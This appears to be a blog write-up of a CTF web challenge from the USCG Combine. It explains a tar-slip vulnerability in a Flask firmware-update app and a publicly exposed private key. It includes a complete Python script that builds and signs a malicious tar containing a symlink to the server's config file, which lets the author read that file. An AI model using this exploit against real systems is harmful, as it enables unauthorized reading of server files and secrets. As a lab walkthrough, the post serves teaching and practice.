+++
title = "USCG Season IV Combine Web Week 1"
date = 2024-07-09

[taxonomies]
tags = ["write-up", "ctf", "uscg", "web exploitation"]
+++

Apart of the USCG Combine this season are weekly web exploitation challenges. This is a writeup for the first week.
<!-- more -->
---
# Week 1
{{ figure(src="/img/uscg24-web-week1/homepage.png", caption="Homepage for week 1's web challenge.") }}
## Challenge Description
For week 1 we are actually given a bit of a background:
> *The USCG factory has been hit by ransomware and we've lost access to a critical piece of machinery! There is a master reset code hidden in the configuration files which we could use to reset it back to the factory image but we can't seem to access it. We have access to a firmware update page but can't seem to be able to overwrite the existing firmware with something to give us back control. Please help!*

This is a relatively smaller web app, so there is not much to actually go over.

## Initial Analysis
I initially thought this was another crypto web challenge (there have been a lot of those recently it seems), so I spent some time trying to see if there is a flaw in the logic. However, it turns out that there is a simple solve, that involves no crypto exploitation.

The other thing of interest is that while the flag is defined in `config.py`, it is actually never referenced or used anywhere. This means that we will probably need to find some sort of arbitrary file read (like lfi), or RCE on the web app.

## Solution
This challenge involves exploiting a tar slip vulnerability to read arbitrary files on the server.

### Code Analysis
There are two main flaws with the application:
1. assets are made public, which includes uploaded firmware and keys (both public and private)
2. use of `TarFile.extractall` without a filter in `util.py`

The first flaw is made apparent in `main.py` with the line:
```py
app = Flask(__name__,static_url_path="/assets",static_folder="/app/assets")
```
In Flask, this will actually make anything in `/app/assets` publically accessible, assuming you know the path to it! so the private key can be accessed at the url `/assets/keys/private.pem`.

The second flaw is found in `util.py` with the line:
```py
TF.extractall(filepath)
```
which when checking the Python docs for `TarFile.extractall` ([found here](https://docs.python.org/3/library/tarfile.html#tarfile.TarFile.extractall)), it notes that untrusted archives should not be extracted unless inspected. This is due to something known as a zip slip/tar slip vulnerability, which allows for the inclusion of arbitrary files using symlinks.

Tar slip works since for tar files, we can actually include a symlink. So we could put a symlink `config.py` that links to `/app/application/config.py`, and include this in the tar file. This way, when the file is extracted by the server, it will actually stay a symlink on the server, so if someone access `/app/assets/firmware_updates/< random hex >/config.py`, it will actually access `/app/application/config.py`, since its a symlink!

The same vulnerability that allows us to access the private key, can be used to access the symlink since it is also in the public assets folder.

### Putting it into Action
In order to sign our malicious firmware, we will need the private key, which as mentioned before we can directly download at `/assets/keys/private.pem`. We can replicate the way the firmware is signed if we wish, but I have made a simple python script that will make the malicious firmware and sign it, shown below:

```py
import base64
import json
import tarfile
import io
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256

def create_firmware_package(private_key_path):
    # Create a tar file in memory
    tar_buffer = io.BytesIO()
    with tarfile.open(fileobj=tar_buffer, mode='w:gz') as tar:
        # Create a symlink "config.py" to "/app/application/config.py"
        link_info = tarfile.TarInfo("config.py")
        link_info.type = tarfile.SYMTYPE
        link_info.linkname = "/app/application/config.py"
        tar.addfile(link_info)

    # Encode the tar file content
    firmware = base64.b64encode(tar_buffer.getvalue()).decode()

    # Sign the firmware
    with open(private_key_path, 'r') as key_file:
        private_key = RSA.import_key(key_file.read())
    
    hash_obj = SHA256.new(firmware.encode())
    signature = pkcs1_15.new(private_key).sign(hash_obj)
    signature_b64 = base64.b64encode(signature).decode()

    # Create the package
    pkg = {
        "firmware": firmware,
        "signature": signature_b64
    }

    return json.dumps(pkg)

if __name__ == "__main__":
    private_key_path = "./private.pem"  # private key leaked from server

    pkg = create_firmware_package(private_key_path)

    with open("firmware.pkg", "w") as f:
        f.write(pkg)

    print("Firmware package created and saved as firmware.pkg")
```

After creating the malicious firmware, you can now upload it, keeping note of the path it extracted to.
{{ figure(src="/img/uscg24-web-week1/firmware-path.png", caption="The files in the tar (i.e. the symlink) are extracted to '/assets/firmware_updates/< ... >', which is again, public.") }}

We can now simply go to `/assets/firmware_updates/< ... >/config.py` and download it! Since it's a symlink, it will download the linked file instead, which is the servers config.py
{{ figure(src="/img/uscg24-web-week1/leaked-config.png", caption="Leaking the file was successful! Cropped flag since the challenge is still active as of writing.") }}

## Final Thoughts
This was a nice challenge, that almost scared me with crypto, but thankfully was just all web. I had previously exploited a zip slip vulnerability for Hack The Box, so this was familiar to me, but I hadn't done it with a TAR file.